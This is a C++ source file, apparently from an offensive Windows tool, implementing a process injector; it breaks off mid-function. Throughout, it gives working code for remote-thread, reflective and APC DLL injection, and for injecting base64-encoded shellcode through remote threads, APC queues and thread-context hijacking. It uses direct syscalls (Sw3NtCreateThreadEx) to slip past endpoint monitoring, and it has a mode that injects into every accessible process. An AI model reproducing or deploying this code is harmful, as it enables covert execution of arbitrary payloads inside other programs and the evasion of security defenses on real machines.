#include "Injector.h"
#include "Helper.h"
#include "S-Wisper.h"
#include <Windows.h>
#include <tlhelp32.h>

using namespace std;

Injector::Injector(string dll_path) {
    this->DllPath = dll_path;
    this->callback_ = nullptr;
    this->exist = this->bFileExists(this->DllPath);
    this->brutalmod = FALSE;
    if (!exist) {

#ifdef _DEBUG
        cerr << "[!] File Not Exists!\n";
#endif // _DEBUG
        return;
    }
}

Injector::Injector() {
    this->DllPath = "";
    this->exist = FALSE;
    this->brutalmod = FALSE;
    this->callback_ = nullptr;
}


Injector::~Injector() {}

void Injector::DllPathsetter(string dll_path) {
    this->DllPath = dll_path;
    this->exist = this->bFileExists(this->DllPath);
    if (!exist) {
#ifdef _DEBUG
        cerr << "[!] File Not Exists!\n";
#endif // _DEBUG
        return;
    }
}

void Injector::CallBackSetter(CallbackFunction InjecMethod) {
    this->callback_ = InjecMethod;
}

void Injector::BrutalSetter(bool crazy) {
    this->brutalmod = crazy;
}

DWORD Injector::GetPidName(char name[]) {
    BOOL bRet = FALSE;
    DWORD pid = 0;

    size_t size = strlen(name) + 1;
    wchar_t* wideCharStr = new wchar_t[size];
    size_t outSize;
    mbstowcs_s(&outSize, wideCharStr, size, name, size - 1);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        std::cerr << "[!] Failed to create process snapshot." << std::endl;
#endif // _DEBUG
        return 0;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hProcess = NULL;
    BOOL bWow64 = FALSE;
    if (Process32First(hSnapshot, &processEntry)) {
        do {
            if (wcsstr(processEntry.szExeFile, wideCharStr) != nullptr) {
                pid = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }
    else {
#ifdef _DEBUG
        std::cerr << "[!] Failed to retrieve process information." << std::endl;
#endif
        ;
    }

    if (pid == 0) {
        return 0;
    }

    CloseHandle(hSnapshot);
    return pid;
}

/*                  Remote Thread Injection                  */
void Injector::RemoteThreadInject(DWORD pid) {
    bool bRet;
    if (!this->exist) {
        cerr << "[!] Invalid PID\t";
        return;
    }
    if (pid == 0)
        return;
    if (!this->bInjectable(pid))
        return;
    SIZE_T dwWriteSize = 0;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, 0x100, MEM_COMMIT, PAGE_READWRITE);
    if (pAddress == nullptr || hProcess == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        cerr << "[!] Allocate Address or Open Process Failed: " << GetLastError() << endl;
#endif // _DEBUG
        return;
    }

    bRet = WriteProcessMemory(hProcess, pAddress, this->DllPath.c_str(), this->DllPath.size() + 1, &dwWriteSize);
    if (!bRet) {
#ifdef _DEBUG
        cerr << "[!] Write Process Failed: " << GetLastError() << endl;
#endif // _DEBUG
        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    HMODULE Ntdll = LoadLibraryA("kernel32.dll");
    if (Ntdll == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        cerr << "[!] Failed Loadlibrary kernel32: " << GetLastError() << endl;
#endif // _DEBUG
        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    LPVOID LoadLibraryBase = GetProcAddress(Ntdll, "LoadLibraryA");
    if (LoadLibraryBase == nullptr) {
#ifdef _DEBUG
        cerr << "[!] No Such Function in Library \n";
#endif // _DEBUG
        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    //HANDLE hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, NULL, NULL);
    HANDLE hRemoteProcess = NULL;
#ifdef _WIN64
    NTSTATUS status = Sw3NtCreateThreadEx(&hRemoteProcess, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, FALSE, NULL, NULL, NULL, NULL);
    if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL || status != STATUS_SUCCESS) {
#ifdef _DEBUG
        cerr << "[!] Create Remote Thread Failed!: " << GetLastError() << endl;;
#endif // _DEBUG
        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
        CloseHandle(hProcess);
        FreeModule(Ntdll);
        return;
}
#else
#ifdef _WIN32
        hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, NULL, NULL);
        if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL) {
#ifdef _DEBUG
            cerr << "[!] Create Remote Thread Failed!: " << GetLastError() << endl;;
#endif // _DEBUG
            VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
            CloseHandle(hProcess);
            FreeModule(Ntdll);
            return;
        }
#endif // _WIN32
#endif // _WIN64


    WaitForSingleObject(hRemoteProcess, 500);

    VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
    CloseHandle(hProcess);
    FreeModule(Ntdll);
}

void Injector::unInject(DWORD pid) {
    if (pid == 0)
        return;

    MODULEENTRY32 result = { sizeof(result) };
    if (!this->exist)
        return;
    if (!this->bGetModule(pid, result))
        return;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
#ifdef _DEBUG
        cerr << "[!] Open Process Failed: " << GetLastError() << endl;
#endif // _DEBUG
        return;
    }

    HMODULE hModule = GetModuleHandle(L"kernel32.dll");
    if (hModule == NULL) {
#ifdef _DEBUG
        cerr << "[!] Get Module Failed: " << GetLastError() << endl;
#endif // _DEBUG
        CloseHandle(hProcess);
        return;
    }

    LPTHREAD_START_ROUTINE hFreeLib = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "FreeLibrary");
    if (hFreeLib == NULL) {
#ifdef _DEBUG
        cerr << "[!] Found FreeLibrary Failed: " << GetLastError() << endl;
#endif // _DEBUG
        CloseHandle(hProcess);
        FreeModule(hModule);
        return;
    }

    //HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, hFreeLib, result.modBaseAddr, 0, NULL);
    HANDLE hThread = NULL;
#ifdef _WIN64
    NTSTATUS status = Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)hFreeLib, result.modBaseAddr, FALSE, NULL, NULL, NULL, NULL);
    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL || status != STATUS_SUCCESS) {
#ifdef _DEBUG
        cerr << "[!] Free Remote Library Failed!: " << GetLastError() << endl;;
#endif // _DEBUG
        CloseHandle(hProcess);
        return;
    }
#else
#ifdef _WIN32
    hThread = CreateRemoteThread(hProcess, NULL, 0, hFreeLib, result.modBaseAddr, 0, NULL);
    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
#ifdef _DEBUG
        cerr << "[!] Free Remote Library Failed!: " << GetLastError() << endl;;
#endif // _DEBUG
        CloseHandle(hProcess);
        return;
    }
#endif // _WIN32
#endif // _WIN64

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hProcess);
    FreeModule(hModule);
    //CloseHandle(hFreeLib);
}


/*                  Reflect DLL Injection                  */
void Injector::ReflectInject(DWORD pid) {
    if (pid == 0)
        return;

    if (!this->exist)
        return;
    HANDLE hFile = CreateFileA(this->DllPath.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        cerr << "[!] Create File Failed: " << GetLastError() << endl;
#endif // _DEBUG
        return;
    }
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == 0) {
#ifdef _DEBUG
        cerr << "[!] File Size is Zero!\n";
#endif // _DEBUG
        CloseHandle(hFile);
        return;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        cerr << "[!] Allocate Address or Open Process Failed: " << GetLastError() << endl;
#endif // _DEBUG
        CloseHandle(hFile);
        return;
    }

    LPVOID pBase = VirtualAllocEx(hProcess, NULL, (SIZE_T)dwFileSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pBase == NULL) {
#ifdef _DEBUG
        cerr << "[!] Allocate Memory Failed: " << GetLastError() << endl;
#endif // _DEBUG
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return;
    }

    SIZE_T dwWriteSize = 0;
    char* buffer = new char[dwFileSize];
    DWORD dwReadSize;
    if (ReadFile(hFile, buffer, dwFileSize, &dwReadSize, NULL) == FALSE) {
#ifdef _DEBUG
        std::cerr << "Failed to read the file." << std::endl;
#endif
        delete[] buffer;
        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return;
    }


    DWORD dwReflectiveLoaderOffset = this->dwGetOffset(buffer, (CHAR*)"ReflectiveLoader");
    if (dwReflectiveLoaderOffset == 0) {
#ifdef _DEBUG
        cerr << "[!] Get Export Function Error\n";
#endif // _DEBUG
        delete[] buffer;
        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return;
    }

    bool bRet = WriteProcessMemory(hProcess, pBase, buffer, dwFileSize, &dwWriteSize);
    LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pBase + dwReflectiveLoaderOffset);

    //HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, pBase, (DWORD)NULL, NULL);
    HANDLE hThread = NULL;
#ifdef _WIN64
    NTSTATUS status = Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpReflectiveLoader, pBase, FALSE, NULL, NULL, NULL, NULL);
    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL || status != STATUS_SUCCESS) {
#ifdef _DEBUG
        cerr << "[!] Create Thread Failed: " << GetLastError() << endl;
#endif // _DEBUG
        delete[] buffer;
        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return;
    }
#else
#ifdef _WIN32
    hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, pBase, (DWORD)NULL, NULL);
    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
#ifdef _DEBUG
        cerr << "[!] Create Thread Failed: " << GetLastError() << endl;
#endif // _DEBUG
        delete[] buffer;
        VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return;
    }
#endif // _WIN32

#endif // _WIN64


    WaitForSingleObject(hThread, 500);

    delete[] buffer;
    VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);
    CloseHandle(hFile);
    CloseHandle(hProcess);
    CloseHandle(hThread);
}

void Injector::unReflectInject(DWORD pid) {}


/*                  APC Dispatch Injection                  */
void Injector::ApcInject(DWORD pid) {
    bool bRet;
    if (pid == 0)
        return;
    if (!this->exist)
        return;
    
    if (!this->bInjectable(pid))
        return;
    SIZE_T dwWriteSize = 0;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, 0x300, MEM_COMMIT, PAGE_READWRITE);
    if (pAddress == nullptr || hProcess == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        cerr << "[!] Allocate Address or Open Process Failed: " << GetLastError() << endl;
#endif // _DEBUG
        return;
    }

    bRet = WriteProcessMemory(hProcess, pAddress, this->DllPath.c_str(), this->DllPath.size() + 1, &dwWriteSize);
    if (!bRet) {
#ifdef _DEBUG
        cerr << "[!] Write Process Failed: " << GetLastError() << endl;
#endif // _DEBUG
        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    HMODULE Ntdll = LoadLibraryA("kernel32.dll");
    if (Ntdll == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        cerr << "[!] Failed Loadlibrary kernel32: " << GetLastError() << endl;
#endif // _DEBUG
        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    LPVOID LoadLibraryBase = GetProcAddress(Ntdll, "LoadLibraryA");
    if (LoadLibraryBase == nullptr) {
#ifdef _DEBUG
        cerr << "[!] No Such Function in Library \n";
#endif // _DEBUG
        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE || hThreadSnap == 0) {
#ifdef _DEBUG
        std::cout << "[!] Create Snap Failed: " << GetLastError() << endl;
#endif // _DEBUG
        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    BOOL bStat = FALSE;
    HANDLE hThread = NULL;

    //得到第一个线程
    if (Thread32First(hThreadSnap, &te)) {
        do
        {
            if (te.th32OwnerProcessID == pid) {
                hThread = OpenThread(PROCESS_ALL_ACCESS, FALSE, te.th32ThreadID); \
                    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
#ifdef _DEBUG
                        std::cout << "Error In APC Injection\n";
#endif // _DEBUG
                        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
                        CloseHandle(hProcess);
                        CloseHandle(hThreadSnap);
                        return;
                    }

                DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryBase, hThread, (ULONG_PTR)pAddress);

                if (dwRet > 0)	bStat = TRUE;
                CloseHandle(hThread);
                break;
            }
        } while (Thread32Next(hThreadSnap, &te));
    }
    VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
    CloseHandle(hProcess);
    CloseHandle(hThreadSnap);
}

void Injector::unApcInject(DWORD pid) {}


/*                  List Injectable Process                  */
void Injector::Injectable() {
    // 获取进程快照
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        cerr << "[!] Failed to create process snapshot." << endl;
#endif // _DEBUG
        return;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hProcess = NULL;
    BOOL bWow64 = FALSE;

    if (Process32First(hSnapshot, &processEntry)) {
        do {
            if (this->bInjectable(processEntry.th32ProcessID)) {
                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processEntry.th32ProcessID);
                if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
                    cerr << "[!] Failed to open process." << endl;
#endif // _DEBUG
                    CloseHandle(hSnapshot);
                    return;
                }
                if (IsWow64Process(hProcess, &bWow64)) {
                    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
#ifdef _WIN64   
                    if (!bWow64) {
                        set_color(FOREGROUND_RED | FOREGROUND_GREEN, FOREGROUND_INTENSITY);
                        cout << "[^] X64 Injectable\t";
                        set_normal();
                        // x64 回调注入
                        if (this->callback_ != NULL) {

                            cout << "Process ID: " << processEntry.th32ProcessID << "\t";
                            wcout << "Process Name: " << processEntry.szExeFile << "\n";
                            try
                            {
                                (this->*callback_)(processEntry.th32ProcessID);
                            }
                            catch (const std::exception&)
                            {
                                set_color(FOREGROUND_RED, FOREGROUND_INTENSITY);
                                cout << "[!] Inject CallBack Function Failed!\n";
                                set_normal();
                            }

                            if (!this->brutalmod)
                                break;
                        }
                    }
                    else {
                        set_color(FOREGROUND_RED, FOREGROUND_INTENSITY);
                        cout << "[^] X32 Injectable, Need 32 bit injector\t";
                        set_normal();
                    }
#else
                    if (bWow64) {
                        set_color(FOREGROUND_RED | FOREGROUND_GREEN, FOREGROUND_INTENSITY);
                        cout << "[^] X86 Injectable\t";
                        set_normal();
                        // x64 回调注入
                        if (this->callback_ != NULL) {
                            cout << "Process ID: " << processEntry.th32ProcessID << "\t";
                            wcout << "Process Name: " << processEntry.szExeFile << "\n";
                            try
                            {
                                (this->*callback_)(processEntry.th32ProcessID);
                            }
                            catch (const std::exception&)
                            {
                                set_color(FOREGROUND_RED, FOREGROUND_INTENSITY);
                                cout << "[!] Inject CallBack Function Failed!\n";
                                set_normal();
                            }
                            if (!this->brutalmod)
                                break;
                        }
                    }
                    else {
                        set_color(FOREGROUND_RED, FOREGROUND_INTENSITY);
                        cout << "[^] X64 Injectable, Need 64 bit injector\t";
                        set_normal();
                    }

#endif // _WIN64
                    cout << "Process ID: " << processEntry.th32ProcessID << "\t";
                    wcout << "Process Name: " << processEntry.szExeFile << "\n";
                }
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }
    else {
#ifdef _DEBUG
        cerr << "[!] Failed to retrieve process information." << endl;
#endif
        ;
    }

    CloseHandle(hSnapshot);
}


std::vector<ProcessInfo> Injector::InjectList() {
    std::vector<ProcessInfo> procInfo;

    // 获取进程快照
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        cerr << "[!] Failed to create process snapshot." << endl;
#endif // _DEBUG
        return procInfo;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hProcess = NULL;
    BOOL bWow64 = FALSE;

    if (Process32First(hSnapshot, &processEntry)) {
        do {
            if (this->bInjectable(processEntry.th32ProcessID)) {
                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processEntry.th32ProcessID);
                if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
                    cerr << "[!] Failed to open process." << endl;
#endif // _DEBUG
                    CloseHandle(hSnapshot);
                    return procInfo;
                }
                if (IsWow64Process(hProcess, &bWow64)) {
                    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
#ifdef _WIN64   
                    if (!bWow64)
                            procInfo.push_back(ProcessInfo{ processEntry.th32ProcessID ,processEntry.szExeFile });
#elif _WIN32
                    if (bWow64)
                            procInfo.push_back(ProcessInfo{ processEntry.th32ProcessID ,processEntry.szExeFile });

#endif // _WIN64
                    //procInfo.push_back(ProcessInfo{ processEntry.th32ProcessID ,processEntry.szExeFile });
                }
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }
    else {
#ifdef _DEBUG
        cerr << "[!] Failed to retrieve process information." << endl;
#endif
        ;
    }

    CloseHandle(hSnapshot);
    return procInfo;
}


/*                  Inject With Shellcode                  */
void Injector::ShellcodeInject(string basedsc, DWORD pid) {
    BOOL bRet;

    string shellcode = Base64Decode(basedsc);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    DWORD size = shellcode.size() + 1;
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pAddress == nullptr || hProcess == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        cerr << "[!] Allocate Address or Open Process Failed: " << GetLastError() << endl;
#endif // _DEBUG
        return;
    }

    bRet = WriteProcessMemory(hProcess, pAddress, shellcode.c_str(), size - 1, NULL);
    if (!bRet) {
#ifdef _DEBUG
        cerr << "[!] Write Memory Failed: " << GetLastError() << endl;
#endif // _DEBUG
        CloseHandle(hProcess);
        VirtualFree(pAddress, shellcode.size() + 1, MEM_COMMIT);
        return;
    }

    //HANDLE hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
    HANDLE hRemoteProcess = NULL;
#ifdef _WIN64
    NTSTATUS status = Sw3NtCreateThreadEx(&hRemoteProcess, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)pAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL || status != STATUS_SUCCESS) {
#ifdef _DEBUG
        cerr << "[!] Create Remote Thread Failed!: " << GetLastError() << endl;;
#endif // _DEBUG
        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }
#else
#ifdef _WIN32
    hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
    if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL) {
#ifdef _DEBUG
        cerr << "[!] Create Remote Thread Failed!: " << GetLastError() << endl;;
#endif // _DEBUG
        VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }
#endif // _WIN32

#endif // _WIN64

    WaitForSingleObject(hRemoteProcess, INFINITE);
    VirtualFreeEx(hProcess, pAddress, shellcode.size() + 1, MEM_COMMIT);
    CloseHandle(hProcess);
}


/*                  Inject Shellcode With APC Dispatch                 */
void Injector::ApcShellcodeInject(string basedsc, DWORD pid) {
    BOOL bRet;

    string shellcode = Base64Decode(basedsc);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    DWORD size = shellcode.size() + 1;
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_READWRITE);//???? Sth intresting happend here Why need READ
    if (pAddress == nullptr || hProcess == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        cerr << "[!] Allocate Address or Open Process Failed: " << GetLastError() << endl;
#endif // _DEBUG
        return;
    }

    bRet = WriteProcessMemory(hProcess, pAddress, shellcode.c_str(), size - 1, NULL);
    if (!bRet) {
#ifdef _DEBUG
        cerr << "[!] Write Memory Failed: " << GetLastError() << endl;
#endif // _DEBUG
        CloseHandle(hProcess);
        VirtualFree(pAddress, shellcode.size() + 1, MEM_COMMIT);
        return;
    }
    shellcode = "\x00\x00\x00\x00";

    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE || hThreadSnap == 0) {
#ifdef _DEBUG
        std::cout << "[!] Create Snap Failed: " << GetLastError() << endl;
#endif // _DEBUG
        VirtualFreeEx(hProcess, pAddress, size, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    BOOL bStat = FALSE;
    HANDLE hThread = NULL;

    if (Thread32First(hThreadSnap, &te)) {
        do
        {
            if (te.th32OwnerProcessID == pid) {
                hThread = OpenThread(PROCESS_ALL_ACCESS, FALSE, te.th32ThreadID);
                //hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
#ifdef _DEBUG
                    std::cout << "[!] Error In APC Injection\n";
#endif // _DEBUG
                    VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
                    CloseHandle(hProcess);
                    CloseHandle(hThreadSnap);
                    return;
                }
                DWORD lpflOldProtect;
                VirtualProtectEx(hProcess, pAddress, (SIZE_T)size + 1, PAGE_EXECUTE, &lpflOldProtect);
                DWORD dwRet = QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL);

                if (dwRet > 0)	bStat = TRUE;
                CloseHandle(hThread);
                break;
            }
        } while (Thread32Next(hThreadSnap, &te));
    }
    VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
    CloseHandle(hProcess);
    CloseHandle(hThreadSnap);
}


/*                  Inject Shellcode With Context Resume                 */
void Injector::ContextShellcodeInject(string basedsc, DWORD pid) {
    BOOL bRet;

    string shellcode = Base64Decode(basedsc);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    DWORD size = shellcode.size() + 1;
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (pAddress == nullptr || hProcess == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        cerr << "[!] Allocate Address or Open Process Failed: " << GetLastError() << endl;
#endif // _DEBUG
        return;
    }

    bRet = WriteProcessMemory(hProcess, pAddress, shellcode.c_str(), size - 1, NULL);
    if (!bRet) {
#ifdef _DEBUG
        cerr << "[!] Write Memory Failed: " << GetLastError() << endl;
#endif // _DEBUG
        CloseHandle(hProcess);
        VirtualFree(pAddress, (SIZE_T)shellcode.size() + 1, MEM_COMMIT);
        return;
    }
    shellcode = "\x00\x00\x00\x00";

    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE || hThreadSnap == 0) {
#ifdef _DEBUG
        std::cout << "[!] Create Snap Failed: " << GetLastError() << endl;
#endif // _DEBUG
        VirtualFreeEx(hProcess, pAddress, size, MEM_COMMIT);
        CloseHandle(hProcess);
        return;
    }

    BOOL bStat = FALSE;
    HANDLE hThread = NULL;
    DWORD dwRet = 0;
    CONTEXT context = { 0 };
    context.ContextFlags = CONTEXT_CONTROL;

    //得到第一个线程(main thread)
    if (Thread32First(hThreadSnap, &te)) {
        //main thread can not be hijacked
        while (Thread32Next(hThreadSnap, &te)) {
            if (te.th32OwnerProcessID == pid) {
                hThread = OpenThread(PROCESS_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
#ifdef _DEBUG
                    std::cout << "[!] Error In APC Injection\n";
#endif // _DEBUG
                    VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
                    CloseHandle(hProcess);
                    CloseHandle(hThreadSnap);
                    return;
                }
                DWORD lpflOldProtect;
                VirtualProtectEx(hProcess, pAddress, (SIZE_T)size + 1, PAGE_EXECUTE, &lpflOldProtect);
                dwRet = SuspendThread(hThread);
                if (dwRet == (DWORD)-1) {
#ifdef _DEBUG
                    cerr << "[!] Suspen Thread Failed: " << GetLastError() << endl;
#endif // _DEBUG
                    CloseHandle(hThread);
                    continue;
                }

                dwRet = GetThreadContext(hThread, &context);
                if (!dwRet) {
#ifdef _DEBUG
                    cerr << "[!] Get Thread Context Failed: " << GetLastError() << endl;
#endif // _DEBUG
                    CloseHandle(hThread);
                    continue;
                }

#ifdef _WIN64
                context.Rip = (DWORD64)pAddress;
#else
                context.Eip = (DWORD)pAddress;
#endif // _WIN64
                dwRet = SetThreadContext(hThread, &context);
                if (!dwRet) {
#ifdef _DEBUG
                    cerr << "[!] Set Thread Context Failed: " << GetLastError() << endl;
#endif // _DEBUG
                    CloseHandle(hThread);
                    continue;
                }

                ResumeThread(hThread);
                if (dwRet == (DWORD)-1) {
#ifdef _DEBUG
                    cerr << "[!] Resume Thread Failed: " << GetLastError() << endl;
#endif // _DEBUG
                    CloseHandle(hThread);
                    continue;
                }

                CloseHandle(hThread);
                break;
            }
        }
    }
    VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT);
    CloseHandle(hProcess);
    CloseHandle(hThreadSnap);

}



/*                  Some Gadget                  */
bool Injector::bFileExists(string filePath) {
    DWORD fileAttributes = GetFileAttributesA(filePath.c_str());

    if (fileAttributes != INVALID_FILE_ATTRIBUTES &&
        !(fileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
        return true;
    }

    return false;
}

bool Injector::bInjectable(DWORD pid) {
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (processHandle == NULL) {
#ifdef _DEBUG
        cerr << "[!] Failed to open process: " << GetLastError() << endl;
#endif
        return false;
    }

    // 在目标进程中分配内存
    LPVOID remoteMemory = VirtualAllocEx(processHandle, nullptr, sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (remoteMemory == nullptr) {
#ifdef _DEBUG
        cerr << "[!] Failed to allocate remote memory: " << GetLastError() << endl;
#endif
        CloseHandle(processHandle);
        return false;
    }

    // 关闭句柄和释放内存
    VirtualFreeEx(processHandle, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(processHandle);

    return true;
}

bool Injector::bGetModule(DWORD pid, MODULEENTRY32& result) {
    BOOL bRet = FALSE;
    HANDLE hSnapshot;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        cerr << "[!] Create Snap Failed: " << GetLastError() << endl;
#endif // _DEBUG
        return FALSE;
    }


    bRet = Module32First(hSnapshot, &result);
    for (; bRet; bRet = Module32Next(hSnapshot, &result))
    {
        // 将宽字符数组转为窄字符数组
        size_t bufferSize = wcslen(result.szExePath) + 1;
        char convertedWideStr[0x1000];
        //wcstombs_s(convertedWideStr, result.szExePath, bufferSize);
        wcstombs_s(nullptr, convertedWideStr, bufferSize, result.szExePath, _TRUNCATE);
        if (!strcmp(convertedWideStr, this->DllPath.c_str()))
